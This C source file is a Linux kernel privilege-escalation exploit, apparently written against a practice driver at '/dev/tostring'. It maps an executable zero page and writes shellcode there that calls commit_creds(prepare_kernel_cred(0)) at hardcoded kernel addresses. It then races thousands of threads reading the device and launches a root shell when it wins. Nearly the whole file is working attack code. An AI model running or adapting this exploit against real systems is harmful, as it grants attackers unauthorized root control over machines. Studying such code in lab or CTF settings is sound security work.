#include <stdio.h>
#include <string.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <errno.h>
#include <pthread.h>
#include <unistd.h>
#include <errno.h>

#define UNUSED(x)	((void)(x))
#define NUM_RACE	10000

int fd, i;
char buf[512];

typedef int __attribute__((regparm(3)))(*_commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3)))(*_prepare_kernel_cred)(unsigned long cred);

_commit_creds commit_creds;
_prepare_kernel_cred prepare_kernel_cred;

void *thread_fcall(void *arg)
{
	fd = open("/dev/tostring", O_RDWR);
	read(fd, buf, sizeof(buf));
	close(fd);

	if (!getuid()) {
		printf("[*] Winning the race (# %d). Launching rootshell.\n", i);
		execl("/bin/sh", "sh", NULL);
	}

	return NULL;
}

void alter_creds(void)
{
	commit_creds(prepare_kernel_cred(0));
}

int main(int argc, char **argv, char **envp)
{
	UNUSED(argc);
	UNUSED(argv);
	UNUSED(envp);

	pthread_t t0;
	char *pcall;

	pcall = mmap(NULL, sysconf(_SC_PAGESIZE), PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);

	if (pcall == MAP_FAILED) {
			fprintf(stderr, "%s\n", strerror(errno));
			return -1;
	}

	printf("[*] Mapping zero page.\n");

	commit_creds = (_commit_creds)0xffffffff8107ab70; // lihat /proc/kallsyms
	prepare_kernel_cred = (_prepare_kernel_cred)0xffffffff8107af00; // lihat /proc/kallsyms

	printf("[*] Copying alter_creds function ptr into zero page.\n");

	char *payload = "\x48\x31\xff\xe8\xf8\xae\x07\x81\x48\x89\xc7\xe8\x60\xab\x07\x81\xc3" ;
	memcpy(pcall, payload, strlen(payload));

	// pcall[0] = '\xff';
	// pcall[1] = '\x25';
	// *(unsigned long *)&pcall[2] = (sizeof(unsigned int) != sizeof(unsigned long)) ? 0 : 6;
	// *(unsigned long *)&pcall[6] = (unsigned long)&alter_creds;
	// // jmp qword ptr [rip] ; rip => &alter_creds

	printf("[*] Starting the race..\n");

	for (i = 0; i < NUM_RACE; i++) {
		pthread_create(&t0, NULL, thread_fcall, NULL);
	}

	printf("[*] Overall task done, detaching every child task..\n");

	for (i = 0; i < NUM_RACE; i++) {
		pthread_detach(t0);
	}

	return 0;
}